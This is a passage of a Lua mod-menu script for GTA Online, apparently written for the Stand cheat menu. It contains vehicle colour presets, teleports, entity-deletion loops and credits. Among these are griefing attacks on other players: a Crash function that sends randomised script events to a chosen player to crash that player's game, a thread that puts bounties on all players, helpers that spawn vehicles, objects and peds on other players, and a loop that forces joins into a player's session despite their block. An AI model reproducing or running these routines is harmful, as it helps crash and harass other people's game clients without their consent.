    menu.trigger_commands("vehprimaryred 254")
    menu.trigger_commands("vehprimarygreen 2")
    menu.trigger_commands("vehprimaryblue 252")
	menu.trigger_commands("vehsecondaryred 254")
    menu.trigger_commands("vehsecondarygreen 2")
    menu.trigger_commands("vehsecondaryblue 252")
end)
menu.action(vehicules_root, "RGB preset: Len's Color", {"rgblens"}, "g", function(on_click)
    menu.trigger_commands("vehprimaryred 15")
    menu.trigger_commands("vehprimarygreen 0")
    menu.trigger_commands("vehprimaryblue 15")
	menu.trigger_commands("vehsecondaryred 15")
    menu.trigger_commands("vehsecondarygreen 0")
    menu.trigger_commands("vehsecondaryblue 15")
end)

menu.action(vehicules_root, "RGB preset: Blue Yeah Color", {"blueyeah"}, "g", function(on_click)
    menu.trigger_commands("vehprimaryred 68")
    menu.trigger_commands("vehprimarygreen 105")
    menu.trigger_commands("vehprimaryblue 255")
	menu.trigger_commands("vehsecondaryred 68")
    menu.trigger_commands("vehsecondarygreen 105")
    menu.trigger_commands("vehsecondaryblue 255")
end)

menu.action(vehicules_root, "RGB preset: Blue Sky Color", {"bluesky"}, "g", function(on_click)
    menu.trigger_commands("vehprimaryred 125")
    menu.trigger_commands("vehprimarygreen 120")
    menu.trigger_commands("vehprimaryblue 250")
	menu.trigger_commands("vehsecondaryred 125")
    menu.trigger_commands("vehsecondarygreen 120")
    menu.trigger_commands("vehsecondaryblue 250")
end)

menu.action(vehicules_root, "RGB preset: Pink Sky Color", {"pinkpink"}, "g", function(on_click)
    menu.trigger_commands("vehprimaryred 255")
    menu.trigger_commands("vehprimarygreen 128")
    menu.trigger_commands("vehprimaryblue 237")
	menu.trigger_commands("vehsecondaryred 255")
    menu.trigger_commands("vehsecondarygreen 128")
    menu.trigger_commands("vehsecondaryblue 237")
end)

menu.action(vehicules_root, "RGB preset: Red Woah Color", {"redpink"}, "g", function(on_click)
    menu.trigger_commands("vehprimaryred 220")
    menu.trigger_commands("vehprimarygreen 0")
    menu.trigger_commands("vehprimaryblue 45")
	menu.trigger_commands("vehsecondaryred 220")
    menu.trigger_commands("vehsecondarygreen 0")
    menu.trigger_commands("vehsecondaryblue 45")
end)



menu.toggle_loop(historyjoin_root, "History Join Loop", {"historyjoinplayer"}, "Modify the Lua with name of the player for join with the block join enabled in loop the player", function(on_tick)
	menu.trigger_commands("historyjoinKriszButabi")
	util.yield(300)
end)

menu.action(teleport_root, "Teleport to Fontaine", {"teleportfontaine"}, "", function(on_click)
	local me = PLAYER.PLAYER_PED_ID()
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(me, -1609.7751, 2081.8792, 72.62493, 0, 0, 0) 
end)
menu.action(teleport_root, "Teleport to Mount Chilliad Jump", {"teleportmontchiliad"}, "", function(on_click)
	local me = PLAYER.PLAYER_PED_ID()
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(me, 413.18887, 5572.6694, 779.8468, 0, 0, 0) 
end)
menu.action(superclean_root, "Super clean", {"supercleanse"}, "Uses stand API to delete EVERY entity it finds (including player vehicles!).", function(on_click)
	local ct = 0
	for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
		entities.delete_by_handle(ent)
		ct = ct + 1
	end
	for k,ent in pairs(entities.get_all_peds_as_handles()) do
		if not is_ped_player(ent) then
			entities.delete_by_handle(ent)
		end
		ct = ct + 1
	end
	for k,ent in pairs(entities.get_all_objects_as_handles()) do
		entities.delete_by_handle(ent)
		ct = ct + 1
	end
	util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
end)

menu.toggle_loop(superclean_root, "Protection Spam Ped and Objects", {"protectionspamentity"}, "Anti SPAM", function(on)
	local ct = 0
	for k,ent in pairs(entities.get_all_peds_as_handles()) do
		if not is_ped_player(ent) then
			entities.delete_by_handle(ent)
		end
		ct = ct + 1
	end
	for k,ent in pairs(entities.get_all_objects_as_handles()) do
		entities.delete_by_handle(ent)
		ct = ct + 1
	end
	util.yield(430)	
end)

menu.toggle_loop(superclean_root, "Protection Spam Vehicule", {"protectionspamentity2"}, "Anti SPAM", function(on)
	local ct = 0
	for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
		entities.delete_by_handle(ent)
		ct = ct + 1
	end
	util.yield(430)	
end)

--menu.toggle_loop(superclean_root, "BackList Kick Attemps", {"blacklistcrashattemps"}, "Use that option ON for add automaticly the kicks attemps in the player history", function(on)

--end)

players.on_join(GenerateFeatures)
for pid = 0,30 do 
	if players.exists(pid) then
		GenerateFeatures(pid)
	end
end
function start_infibounty_thread()
    infibounty_thread = util.create_thread(function (thr)
        while true do
            if not infibounty then
                util.stop_thread()
            else
                menu.trigger_commands("bountyall 10000")
            end
            util.yield(9000)
        end
    end)
end
menu.action(credits_root, "THIS-IS-TERROR", {"credits"}, "Credits to : THIS-IS-TERROR", function(on_click)
	menu.trigger_commands("say Big Thank for my bro, THIS-IS-TERROR")
	util.toast("Big Thank for my bro, THIS-IS-TERROR")
end)
menu.action(credits_root, "Wiri", {"credits"}, "Credits to : Wiri", function(on_click)
	menu.trigger_commands("say Big Thank for the work of, Wiri")
	util.toast("Big Thank for the work of, Wiri")
end)
menu.action(credits_root, "dom736", {"credits"}, "Credits to : dom736®", function(on_click)
	menu.trigger_commands("say Big Thank for the work of, dom736®")
	util.toast("Big Thank for the work of, dom736")
end)
menu.action(credits_root, "ICYPheonix", {"credits"}, "Credits to : ICYPheonix", function(on_click)
	menu.trigger_commands("say Big Thank for the work of, ICYPheonix")
	util.toast("Big Thank for the work of, ICYPheonix")
end)
menu.action(credits_root, "Lance", {"credits"}, "Credits to : Lance", function(on_click)
	menu.trigger_commands("say Big Thank for the work of, Lance")
	util.toast("Big Thank for the work of, Lance")
end)
menu.action(credits_root, "...YOU", {"credits"}, "Credits to : YOU", function(on_click)
	menu.trigger_commands("say Big Thank for using Len's Script")
	util.toast("Big Thank for you for using Len's Script !!!")
end)

function DRAW_LOCKON_SPRITE_ON_PLAYER(pid, color)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local mpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	local dist = vect.dist(pos, mpos)
	local max = 2000.0
	local delta = max - dist
	local mult = delta / max

	if dist > max then 
		mult = 0.0
	end

	if mult > 1.0 then
		mult = 1.0
	end

	local ptrx, ptry = alloc(), alloc()
	color = color or {['r'] = 255, ['g'] = 0, ['b'] = 0}
	
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") do
		wait()
	end
	
	--GRAPHICS.SET_DRAW_ORIGIN(pos.x, pos.y, pos.z, 0)
	GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pos.x, pos.y, pos.z, ptrx, ptry)
	local posx = memory.read_float(ptrx); memory.free(ptrx)
	local posy = memory.read_float(ptry); memory.free(ptry)
	GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_outline", posx, posy, mult * 0.03 * 1.5, mult * 0.03 * 2.6, 90.0, color.r, color.g, color.b, 255, true)
end

function delete_entity(ent)
    local type = ent_types[ent]
    if type == "o" then
        spooner_objs[ent] = nil
    elseif type == "v" then
        spooner_vehicles[ent] = nil
    elseif type == "p" then
        spooner_peds[ent] = nil
    end
    menu.delete(ent_lists[ent])
    ent_lists[ent] = nil
	entities.delete_by_handle(ent)
end

-- get all players in the session
-- if a player ped is on screen draws a lock-on sprite on them
-- color is cyan for strangers and lime for friends

selectedplayer = {}
for b = 0, 31 do
    selectedplayer[b] = false
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end

function Crash(pid) 
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end


function give_vehicle1(pid, hash)
    request_model_load(hash)
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 10.0)
    local car1 = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
    
end
function give_object1(pid, hash)
    request_model_load(hash)
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 10.0)
    local object1 = entities.create_object(hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
    
end
function give_ped1(pid, hash)
    request_model_load(hash)
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 200.0)
    local ped1 = entities.create_ped(1, hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
    
end
function give_object2(pid, hash)
    request_model_load(hash)
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 0.0, 1.9)
    local object1 = entities.create_object(hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
    
end
function give_ped2(pid, hash)
    request_model_load(hash)
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 0.0, 20.5)
    local ped1 = entities.create_ped(1, hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
    
end
function is_ped_player(ped)
    if PED.GET_PED_TYPE(ped) >= 4 then
        return false
    else
        return true
    end
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
